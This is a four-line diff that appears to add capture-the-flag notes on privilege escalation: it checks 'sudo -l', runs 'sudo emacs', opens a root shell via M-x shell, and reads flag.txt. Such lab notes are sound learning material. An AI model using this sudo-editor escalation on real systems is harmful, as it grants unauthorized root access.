@@ -1,0 +1,4 @@
+Check which binary has sudo rights using sudo -l
+sudo emacs
+Press alt+x to enter M-x mode and type 'shell'
+Now you are the root. Read flag.txt
